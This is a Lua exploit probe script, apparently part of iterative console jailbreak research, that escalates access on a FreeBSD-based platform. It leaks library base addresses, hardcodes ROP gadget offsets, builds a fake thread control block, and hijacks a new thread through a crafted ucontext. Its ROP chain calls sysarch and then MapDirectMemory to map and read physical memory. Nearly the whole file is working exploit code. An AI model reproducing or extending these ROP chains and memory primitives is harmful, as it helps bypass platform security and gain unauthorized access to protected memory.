-- CRASH_CLASS: HIGH
-- PROBE 531l: MapDirectMemory with fake TCB setup first
--
-- 531k: child created but MapDirectMemory crashed (no TLS).
-- From 384b: child needs sysarch(SET_FSBASE=129, &fake_tcb) for errno/%fs:0.
--
-- Plan:
-- 1. thr_create(430) with r8=phys, r9=align in initial regs
-- 2. RIP = pop_rax_ret (start of ROP chain, NOT map_fn directly)
-- 3. ROP chain: sysarch(165) with rax=165, rdi=129, rsi=fake_tcb_ptr
-- 4. After sysarch returns, r8/r9 should be PRESERVED (syscall doesn't clobber them)
-- 5. Then: pop rdi → out_ptr, pop rsi → len, pop rdx → prot, pop rcx → flags
-- 6. Call map_fn (ret to its address)
-- 7. map_fn uses r8/r9 from initial state (preserved through sysarch)
-- 8. After map_fn returns, store result, thr_exit

print("=== PROBE 531l: TCB+MAPDM ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local syscall_ret = stub

local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Get bases
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eb=%s", hexq(eb)))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("lk=%s", hexq(lk_base)))

local alloc_fn = lk_base + uint64(0x17EF0)
local map_fn = lk_base + uint64(0x15020)

-- Gadgets
local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local pop_rdx_ret = eb + uint64(0x3B02D7)
local pop_rcx_ret = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)

-- [A] Alloc phys
print("[A] Alloc")
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print(string.format("  phys=%s", hexq(phys)))
if not phys or N(phys) == 0 then print("FAIL") return end

-- [B] Shared page + fake TCB
print("[B] Setup")
local sc_477 = mk(477)
local shared = sc_477(uint64(0), uint64(0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sn = N(shared)

-- Fake TCB: 4KB self-referencing pointer buffer (from 384b)
local fake_tcb = sc_477(uint64(0), uint64(0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local tcbn = N(fake_tcb)
-- Fill with self-pointer (tcb->tcb_self = tcb)
for off = 0, 0x100, 8 do
    wq(tcbn + off, fake_tcb)
end

-- Pointer to fake_tcb (sysarch needs ptr to ptr)
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), fake_tcb)

-- Sentinel values on shared page
wq(sn, uint64(0xDEADDEAD))      -- [+0] rv
wq(sn + 8, uint64(0xBEEFBEEF))  -- [+8] marker
wq(sn + 0x10, uint64(0))        -- [+16] VA output
wq(sn + 0x18, uint64(0xAAAA))   -- [+24] sysarch rv

print(string.format("  shared=0x%X tcb=0x%X", sn, tcbn))

-- [C] Child stack + ROP chain
print("[C] Chain")
local stack_sz = 0x200000
local child_stack = sc_477(uint64(0), uint64(stack_sz), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local csn = N(child_stack)
local chain = csn + stack_sz - 0x1000
local i = 0

local function emit(val)
    wq(chain + i, val)
    i = i + 8
end

-- PHASE 1: sysarch(165) — SET_FSBASE (op=129)
-- sysarch(op, parms): rax=165, rdi=129, rsi=&fake_tcb
emit(uint64(165))        -- [0] rax = 165 (sysarch)
emit(syscall_ret)        -- [8] syscall; ret
-- After syscall, need to set rdi=129, rsi=tcb_ptr
-- Wait — pop_rax_ret loads rax then rets.
-- RIP starts at pop_rax_ret. Chain:
-- pop rax → 165
-- ret → pop rdi
-- pop rdi → 129
-- ret → pop rsi
-- pop rsi → tcb_ptr
-- ret → syscall;ret (which reads rax=165, does syscall)
-- syscall; ret → continues...

-- Redo: chain starts with RIP = pop_rax_ret
-- So first thing: pop rax from [rsp] = chain[0]
i = 0  -- reset
emit(uint64(165))        -- [0] rax = 165 (sysarch)
emit(pop_rdi_ret)        -- [8] pop rdi; ret
emit(uint64(129))        -- [16] rdi = 129 (AMD64_SET_FSBASE)
emit(pop_rsi_ret)        -- [24] pop rsi; ret
emit(uint64(N(tcb_ptr))) -- [32] rsi = &tcb pointer
emit(syscall_ret)        -- [40] syscall; ret (sysarch)

-- After sysarch, store its rv to shared+0x18 for debugging
emit(pop_rdi_ret)                -- [48] pop rdi; ret
emit(uint64(sn + 0x18))         -- [56] rdi = shared+0x18
emit(mov_rdi_rax_ret)           -- [64] [rdi]=rax → shared[0x18]=sysarch rv

-- PHASE 2: MapDirectMemory call
-- r8/r9 still hold phys/align from thr_create (syscall preserves r8-r15)
-- Set rdi,rsi,rdx,rcx for args 1-4:
emit(pop_rdi_ret)                -- pop rdi; ret
emit(uint64(sn + 0x10))         -- rdi = out_ptr (&VA output)
emit(pop_rsi_ret)                -- pop rsi; ret
emit(uint64(0x4000))             -- rsi = len
emit(pop_rdx_ret)                -- pop rdx; ret
emit(uint64(3))                  -- rdx = prot (RW)
emit(pop_rcx_ret)                -- pop rcx; ret
emit(uint64(0))                  -- rcx = flags

-- After pop_rcx does "ret", it pops chain[i] into RIP.
-- We put map_fn there → child jumps to MapDirectMemory.
-- At that point, rsp = chain + i + 8.
-- map_fn treats [rsp] as return address, [rsp+8] as 7th arg.
emit(map_fn)                     -- RIP = map_fn

-- These are what map_fn sees on its "stack":
-- [rsp+0] = return address (where map_fn's epilogue rets to)
-- [rsp+8] = 7th arg (name = NULL)
local post_call_addr = chain + i + 16  -- skip return_addr + name
emit(uint64(post_call_addr))     -- return address for map_fn
emit(uint64(0))                  -- 7th arg: name = NULL

-- Post-call chain (rax = MapDirectMemory return value):
emit(pop_rdi_ret)                -- pop rdi; ret
emit(uint64(sn))                 -- rdi = &shared[0]
emit(mov_rdi_rax_ret)            -- [rdi] = rax → shared[0] = rv
emit(pop_rdi_ret)                -- pop rdi; ret
emit(uint64(sn + 8))             -- rdi = &shared[8]
emit(pop_rax_ret)                -- pop rax; ret
emit(uint64(0x444F4E45))         -- rax = "DONE"
emit(mov_rdi_rax_ret)            -- [rdi] = rax → shared[8] = marker
emit(pop_rax_ret)                -- pop rax; ret
emit(uint64(431))                -- rax = thr_exit
emit(syscall_ret)                -- syscall; ret → exit

print(string.format("  chain=0x%X len=%d", chain, i))

-- [D] Build ucontext
print("[D] Context")
local ctx = memory.alloc(0x500)
for off = 0, 0x4BF, 8 do wq(N(ctx) + off, uint64(0)) end

wd(N(ctx) + 0x108, 0x480)
wd(N(ctx) + 0x0D0, 4)
wd(N(ctx) + 0x110, 0x10000)
wd(N(ctx) + 0x0C0, 0x43)
wd(N(ctx) + 0x100, 0x3B)
wq(N(ctx) + 0x0F0, uint64(0x202))

-- RIP = pop_rax_ret (start of chain)
wq(N(ctx) + 0x0E0, pop_rax_ret)
-- RSP = chain start
wq(N(ctx) + 0x0F8, uint64(chain))

-- GPRs: r8=phys, r9=align (preserved through sysarch syscall)
wq(N(ctx) + 0x68, phys)         -- r8
wq(N(ctx) + 0x70, uint64(0x4000))  -- r9

-- [E] Spawn
print("[E] thr_create")
local tid_out = memory.alloc(8)
wq(N(tid_out), uint64(0))
local ok_tc, rv_tc = pcall(function()
    return mk(430)(uint64(N(ctx)), uint64(N(tid_out)), uint64(0))
end)
print(string.format("  rv=%s tid=%s", ok_tc and hexq(rv_tc) or "FAIL", hexq(rq(N(tid_out)))))

-- Wait
print("[F] Wait")
local done = false
for attempt = 1, 100 do
    local dummy = 0
    for j = 1, 50000 do dummy = dummy + 1 end
    local m = rd(sn + 8)
    if m and m ~= 0 then
        local mn = m
        if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0xBEEFBEEF then
            done = true
            break
        end
    end
end

-- Results
print("[G] Results")
print(string.format("  rv=%s", hexq(rq(sn))))
print(string.format("  marker=%s done=%s", hexq(rq(sn + 8)), tostring(done)))
print(string.format("  va=%s", hexq(rq(sn + 0x10))))
print(string.format("  sysarch_rv=%s", hexq(rq(sn + 0x18))))

local va_out = rq(sn + 0x10)
if va_out and N(va_out) ~= 0 then
    print("[H] READ MAPPED MEMORY!")
    local van = N(va_out)
    for off = 0, 0x1C, 4 do
        local ok_r, d = pcall(function() return memory.read_dword(van + off) end)
        if ok_r and d then
            local dn = N(d)
            if dn < 0 then dn = dn + 0x100000000 end
            print(string.format("  [+0x%02X] 0x%08X", off, dn))
        else
            print(string.format("  [+0x%02X] FAULT", off))
            break
        end
    end
end

print("=== 531l DONE ===")
